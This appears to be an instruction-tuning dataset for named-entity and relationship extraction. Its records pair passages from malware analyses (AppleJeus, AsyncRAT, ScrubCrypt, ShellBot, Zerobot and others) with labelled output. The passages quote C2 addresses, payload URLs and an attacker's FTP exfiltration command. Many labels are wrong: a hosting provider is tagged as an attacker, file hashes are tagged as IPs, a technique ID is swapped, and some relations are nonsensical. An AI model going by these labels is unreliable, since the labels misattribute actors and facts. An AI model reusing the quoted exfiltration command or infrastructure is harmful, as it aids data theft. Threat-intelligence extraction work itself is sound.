{"instruction": "AppleJeus Version 6: Dorusio Introduction and Infrastructure In March 2020, an additional version of the AppleJeus malware was identified. This time the malware was marketed and distributed by a legitimate-looking company called Dorusio on their website, dorusio[.]com (Acquire Infrastructure: Domain [T1583.001]). Researchers collected samples for Windows and macOS X versions of the Dorusio Wallet (Develop Capabilities: Malware [T1587.001]). As of at least early 2020, the actual download links result in 404 errors. The download page has release notes with version revisions claiming to start with version 1.0.0, released on April 15, 2019. The domain dorusio[.]com resolved to IP address 198.54.115[.]51 from March 30, 2020 to January 23, 2021. The IP address is controlled by NameCheap Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for CoinGoTrade[.]com and Ants2Whale[.]com.", "input": null, "output": "Named Entities: (AppleJeus, malware), (Dorusio, attacker), (dorusio[.]com, Domain), (T1583.001, technique), (T1587.001, technique), (198.54.115[.]51, IP), (NameCheap Inc., attacker), (CoinGoTrade[.]com, Domain), (Ants2Whale[.]com, Domain)\nRelationships: (AppleJeus, distributed by, Dorusio), (Dorusio, website, dorusio[.]com), (dorusio[.]com, Acquire Infrastructure, T1587.001), (Dorusio, malware, AppleJeus), (Dorusio, develop capabilities, T1587.001), (dorusio[.]com, resolve to, 198.54.115[.]51), (198.54.115[.]51, controlled by, NameCheap Inc.), (198.54.115[.]51, same ASN, CoinGoTrade[.]com), (198.54.115[.]51, same ASN, Ants2Whale[.]com)"}
{"instruction": "The domain dorusio[.]com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. Dorusio Application Analysis Windows Program The Windows version of the malicious application is an MSI Installer. The installer appears to be legitimate and will install the following two programs. Installs Dorusio.exe in folder C:\\Program Files (x86)\\Dorusio Installs DorusioUpgrade.exe in folder C:\\Users\\<username>\\AppData\\Roaming\\DorusioSupport Runs DorusioUpgrade.exe The program, Dorusio.exe, loads a legitimate-looking cryptocurrency wallet platform with no signs of malicious activity and is a copy of an open-source cryptocurrency application.", "input": null, "output": "Named Entities: (dorusio[.]com, Domain), (Sectigo, tool), (Dorusio Application Analysis Windows Program, tool), (MSI Installer, tool), (Dorusio.exe, file), (DorusioUpgrade.exe, file)\nRelationships: (Dorusio Application Analysis Windows Program, installs, Dorusio.exe), (Dorusio Application Analysis Windows Program, installs, DorusioUpgrade.exe), (Dorusio.exe, runs, DorusioUpgrade.exe)"}
{"instruction": "Other machines on the same network \nWe saw suspicious activity on various machines on this same victim\u2019s network. The attackers targeted several other users within the organization with the same file, proposal_pakistan110.chm:error.html, which was opened by an archiver tool and, in one instance, via the Microsoft Edge browser. Following this, we observed a backdoor being executed on the machine, alongside additional tools downloaded to the %APPDATA% directory from the attacker\u2019s infrastructure. \nHash Directory Tool \n450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd CSIDL_COMMON_APPDATA\\oracle local.exe \nee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc CSIDL_COMMON_APPDATA\\adobe adobe.exe \n071e20a982ea6b8f9d482685010be7aaf036401ea45e2977aca867cedcdb0217 c:\\programdata\\oracle java.ee", "input": null, "output": "Named Entities: (proposal_pakistan110.chm:error.html, file), (archiver tool, tool), (Microsoft Edge browser, tool), (backdoor, malware), (450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd, SHA256), (ee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc, SHA256), (071e20a982ea6b8f9d482685010be7aaf036401ea45e2977aca867cedcdb0217, SHA256)\nRelationships: (proposal_pakistan110.chm:error.html, opened by, archiver tool), (proposal_pakistan110.chm:error.html, opened by, Microsoft Edge browser), (archiver tool, executed, backdoor), (attacker's infrastructure, IP, 450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd), (attacker's infrastructure, IP, ee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc), (attacker's infrastructure, IP, 071e20a982ea6b8f9d482685010be7aaf036401ea45e2977aca867cedcdb0217)"}
{"instruction": "At this point, the attackers ceased activity while maintaining access to the network until February 21. At 06:38, the attackers were observed downloading a custom .NET FTP tool to the infected computer. 192.119.15.36 880 hxxp://192.119.15[DOT]36:880/ftp.exe Later at 6:56, the attackers exfiltrated data using this FTP tool to a remote host: JsuObf.exe Nup#Tntcommand -s CSIDL_PROFILE\\appdata\\roaming\\adobe\\rar -a ftp://89.34.237.118:2020 -f /[REDACTED] -u [REDACTED] -p [REDACTED] Activity ceased until the attackers returned on March 5 and were observed using Quasar RAT to download a second custom AutoIt FTP exfiltration tool known as FastUploader from hxxp://192.119.15[DOT]36:880/ftp.exe. This tool was then installed to csidl_profile\\appdata\\roaming\\adobe\\ftp.exe. FastUploader is a custom FTP tool designed to exfiltrate data at a faster rate than traditional FTP clients.", "input": null, "output": "Named Entities: (custom .NET FTP tool, tool), (192.119.15.36, IP), (hxxp://192.119.15[DOT]36:880/ftp.exe, URL), (JsuObf.exe, file), (89.34.237.118:2020, IP), (Quasar RAT, tool), (AutoIt FTP exfiltration tool, tool), (FastUploader, tool), (hxxp://192.119.15[DOT]36:880/ftp.exe, URL), (csidl_profile\\appdata\\roaming\\adobe\\ftp.exe, file)\nRelationships: (JsuObf.exe, exfiltrate data to, 89.34.237.118:2020), (Quasar RAT, download, FastUploader), (FastUploader, install to, csidl_profile\\appdata\\roaming\\adobe\\ftp.exe)"}
{"instruction": "Peering into the JAR Once executed, the JAR files drop a payload JAR file with a random name and extension. The payload JAR is dropped in a randomly named directory and executed. The threat then runs VBS scripts in order to fingerprint the compromised computer. It also uses the Windows Management Instrumentation (WMI) interface to get details of any installed firewall or security products. The threat then sets registry entries to disable System Restore and set Image File Execution Options for many security products and reversing tools to svchost.exe so that the tools cannot start. It also starts ending processes related to monitoring tools. The threat also connects to its command and control (C&C) server (we observed Adwind connecting with 174[.]127[.]99[.]211 but similar IP address ranges have also been used).", "input": null, "output": "Named Entities: (svchost.exe, file), (command and control (C&C) server, tool), (Adwind, malware), (174[.]127[.]99[.]211, IP)\nRelationships: (command and control (C&C) server, observed connecting with, 174[.]127[.]99[.]211)"}
{"instruction": "Once executed, it sends an HTTP GET request to its Command and Control (C2) server at 79.137.206[.]228 to check in and retrieve the stealer configuration (Figure 6). Note the absence of User-Agent and other typical HTTP headers in this GET request. The semicolon delimited configuration can be interpreted as follows: The first comma-delimited block contains single-digit flags, denoted by 1 (enable) or 0 (disable), to toggle specific stealer features. Based on this configuration, this stealer will collect passwords stored locally (e.g., FTP, SSH), browser cookies and history, Telegram data, and screenshots. Cryptocurrency wallet collection is not enabled. A 32-character hexadecimal string (redacted in Figure 6) is a token generated by the C2 server for use in the subsequent data exfiltration request.", "input": null, "output": "Named Entities: (Command and Control (C2) server, tool), (79.137.206[.]228, IP), (cryptocurrency wallet collection, threat type)\nRelationships: (Command and Control (C2) server, IP, 79.137.206[.]228)"}
{"instruction": "To persist in the victim system, it then adds several scheduled tasks to execute the watchdog dllhost.exe every hour. It does this by executing the following command: The scheduled task names impersonate legitimate Windows-related software to deter casual detection and are as follows: SecurityHealthSystray WindowsDefender WmiPrvSE AntiMalwareServiceExecutable Dllhost MicrosoftEdgeUpd OneDriveService NvStray ActivationRule It also changes the power settings of the system to prevent it from hibernating and sleeping by executing the following command to ensure that its Monero cryptominer component (executed later) is always running while the machine is powered up: The host file is also modified to resolve security product-related domains to the IP 0.0.0.0 to disable communication by security products, e.g., for downloading updates. Lastly, it executes the watchdog component %ProgramData%\\dllhost.exe, which executes the actual cryptominer. Dllhost.exe - Miner watchdog", "input": null, "output": "Named Entities: (watchdog dllhost.exe, file), (Monero cryptominer, tool), (0.0.0.0, IP), (%ProgramData%\\dllhost.exe, file)\nRelationships: No related relations."}
{"instruction": "Moobot includes the following process names of known bots and uses the command \u201ckill -9\u201d to ensure it\u2019s the only one running in the infected device: dvrHelper, Ni**eR69xd, 1337SoraLOADER, Ni**eRd0nks1337, X19I239124UIU, IuYgujeIqn, 14Fa, ccAD, BOGOMIPS, /etc/rc.d/rc.local, g1abc4dmo35hnp2lie0kjf, /dev/FTWDT101_watchdog, /dev/netslink/, PRIVMSG, GETLOCALIP, KILLATTK, Eats8, v[0v, 93OfjHZ2z, GhostWuzHere666, WsGA4@F6F, ACDB, AbAd, iaGv Technical Analysis \u2013 ShellBot ShellBot\u2019s activity began in January and primarily targeted Cacti vulnerability. We collected three ShellBot variants in our traffic capture system. The first is \u201cPowerBots (C) GohacK\u201d from http[:]//80[.]68[.]196[.]6/ff, and the configuration is shown in Figure 9. Its C2 is \u201c49[.]212[.]234[.]206:3303\u201d, and the bot\u2019s process masquerades as \u201c/usr/sbin/sshd\u201d to evade detection. After the communication channel setup, the client waits for a command from the server. There are six commands, shown below:", "input": null, "output": "Named Entities: (Moobot, malware), (ShellBot, malware), (PowerBots (C) GohacK, tool), (http[:]//80[.]68[.]196[.]6/ff, URL), (49[.]212[.]234[.]206:3303, IP)\nRelationships: (PowerBots (C) GohacK, C2, 49[.]212[.]234[.]206:3303)"}
{"instruction": "The commands used in perlbot are listed below. It includes numerous types of flooding attacks and hacking functions. It also includes an exploit enhancement module that gets news from a public website offering exploits and security advisories.\nThe third variant is \u201cB0tchZ 0.2a\u201d from 46[.]101[.]183[.]162/.xx/web. The malicious website is shown in Figure 12. All files on this website are IRC botnets that use the same C2 server, 198[.]98[.]61[.]106:8080. The configuration from the payload that targets vulnerable Cacti servers is shown in Figure 13.", "input": null, "output": "Named Entities: (perlbot, malware), (B0tchZ 0.2a, malware), (46[.]101[.]183[.]162, IP), (198[.]98[.]61[.]106:8080, IP)\nRelationships: (perlbot, use, flooding attacks), (B0tchZ 0.2a, variant of, perlbot), (46[.]101[.]183[.]162, seen in, B0tchZ 0.2a), (198[.]98[.]61[.]106:8080, C2 server of, B0tchZ 0.2a)"}
{"instruction": "AsyncRAT is written in C# language and runs in a .Net Framework environment. Since it is fileless in this phishing campaign, I needed to dump it from the notepad.exe process for deep analysis. Once AsyncRAT starts, it decrypts a group of setting values in its Main() function, as shown in Figure 5.1. The setting values for the captured AsyncRAT indicate: A crypto key was used to decrypt the following setting values: The C2 server host and ports 95.216.102.32:6606, 7707, and 8808 The AsyncRAT version is \u201c0.5.7B\u201d \u201cIf maintain persistence\u201d is set to \u201cfalse\u201d The Mutex object name is \"AsyncMutex_6SI8OkPnk\" \u201cIf support Pastbin\u201d is set to \u201cnull\u201d \u201cIf perform anti-analysis detection\u201d is set to \u201cfalse\u201d \u201cIf make the process critical\u201d is set to \u201cfalse\u201d The Group name is set to \u201cDefault\u201d An HWID is generated using the victim\u2019s hardware information", "input": null, "output": "Named Entities: (AsyncRAT, malware), (notepad.exe, file), (95.216.102.32:6606, IP), (95.216.102.32:7707, IP), (95.216.102.32:8808, IP)\nRelationships: (AsyncRAT, dumped from, notepad.exe), (AsyncRAT, communicates with, 95.216.102.32:6606), (AsyncRAT, communicates with, 95.216.102.32:7707), (AsyncRAT, communicates with, 95.216.102.32:8808)"}
{"instruction": "Initial access Based on our observations over the past two months, these attacks originate from 163[.]123[.]142[.]210 and 185[.]17[.]0[.]19. The attackers have targeted an HTTP URI, \u201cwls-wsat/CoordinatorPortType,\u201d which belongs to an Oracle Weblogic server. The corresponding traffic capture is shown in Figure 2. The attack attempts to download a PowerShell named \u201cbypass.ps1\u201d. The partial PowerShell script, \u201cbypass.ps1,\u201d shown in Figure 3, has had its main code and strings encoded to make it harder to be detected by AntiVirus solutions. After three rounds of adding constants, reversing, and Based64 decoding, we finally uncovered clear text. The first variable, \u201c$c\u201d, contains ScrubCrypt. The detail of this variable will be discussed in the next section. The rest of the variables, from \u201c$d\u201d to \u201c$f\u201d, are for AMSI and ETW evasion, which is executed by \u201ciex\u201d at the end of the attack.", "input": null, "output": "Named Entities: (163[.]123[.]142[.]210, IP), (185[.]17[.]0[.]19, IP)\nRelationships: (163[.]123[.]142[.]210, originate from, attack), (185[.]17[.]0[.]19, originate from, attack)"}
{"instruction": "\nTechnical analysis \u2013 final payload\nWe collected several ScrubCrypt samples in February, and each payload is a little different. On 2/14, ScrubCrypt loads \u201cminer\u201d and invokes the process \u201cexplorer.exe\u201d to start the miner process to server 45[.]142[.]122[.]11:8080, shown in Figures 14 and 15. This IP address and wallet were used for the 8220 Gang attack in January 2023.", "input": null, "output": "Named Entities: (ScrubCrypt, malware), (miner, tool), (explorer.exe, file), (45[.]142[.]122[.]11:8080, IP)\nRelationships: (ScrubCrypt, load, miner), (ScrubCrypt, invoke, explorer.exe)"}
{"instruction": "On 2/16, ScrubCrypt loaded a module also named \u201cbat\u2019, as shown in Figure 20, but the data for its unzip is from its \u201cResources\u201d section. It communicates with the same C2 server, and downloads two files from 163[.]123[.]142[.]210. These files are also compressed PE files named \u201cplugin_3.dll\u201d and \u201cplugin_4.dll\u201d. They are identical to the files from 2/15 and start crypto miner activity using the same configuration, as shown in Figure 21.", "input": null, "output": "Named Entities: (ScrubCrypt, malware), (C2 server, tool), (163[.]123[.]142[.]210, IP), (plugin_3.dll, file), (plugin_4.dll, file)\nRelationships: (ScrubCrypt, communicate with, C2 server), (ScrubCrypt, download, plugin_3.dll), (ScrubCrypt, download, plugin_4.dll), (plugin_3.dll, identical to, plugin_4.dll)"}
{"instruction": "Up through October 2022, one of the C2 servers (176[.]65[.]137[.]5) listed in our Zerobot report historically distributed the Mirai-based SORA variant. It then switched to distributing Zerobot the month after. For example, hxxp://176[.]65[.]137[.]5/bins/zero[.]x86 served a UPX-packed SORA binary in October 2022 (Figure 10), but similar URLs with the zero.{arch} filename were later seen distributing Zerobot instead. The switch from distributing SORA to Zerobot, but using the same campaign filename is interesting as these families do not share a common C2 protocol. The intent behind the switch remains unclear. Apart from Zerobot, we are also highlighting several additional Golang botnets caught by our honeypots.", "input": null, "output": "Named Entities: (C2 servers, tool), (176[.]65[.]137[.]5, IP), (Mirai-based SORA variant, malware), (Zerobot, malware), (hxxp://176[.]65[.]137[.]5/bins/zero[.]x86, URL), (Golang botnets, malware)\nRelationships: (C2 servers, distribute, Mirai-based SORA variant), (C2 servers, distribute, Zerobot), (176[.]65[.]137[.]5, C2 server, Mirai-based SORA variant), (176[.]65[.]137[.]5, C2 server, Zerobot), (hxxp://176[.]65[.]137[.]5/bins/zero[.]x86, distribute, Zerobot), (Zerobot, family, Golang botnets)"}
{"instruction": "In general, for the security plugins it cannot bypass, it only reports them to the C2 server by updating the global status message with information similar to the data it sends during a successful login. But it uses \u201c3GOOD\u201d for the brute force status to indicate that credential validation was skipped. On encountering websites that contain the string \u201c1gb.ru\u201d within the page content, GoTrim also sends the same \u201c3GOOD\u201d brute force status. This appears to be a conscious decision to avoid targeting websites hosted by this provider, but the intent remains unclear. Campaign Updates While searching for other samples related to this campaign, we found a PHP script and binary from September 2022 with different URLs \u201c/selects?param=1\u201d and \u201c/selects?walert=1\u201d on C2 server 89[.]208[.]107[.]12 (Figure 6). The PHP script we detect as PHP/GoTrim!tr.dldr uses the same installation method, with only the download URL varying across the samples we gathered.", "input": null, "output": "Named Entities: (security plugins, tool), (C2 server, tool), (PHP script, tool), (binary, tool), (89[.]208[.]107[.]12, IP), (PHP/GoTrim!tr.dldr, malware)\nRelationships: (security plugins, bypass, C2 server), (C2 server, IP, 89[.]208[.]107[.]12), (PHP script, use, C2 server), (binary, use, C2 server), (PHP/GoTrim!tr.dldr, name, PHP/GoTrim!tr.dldr)"}
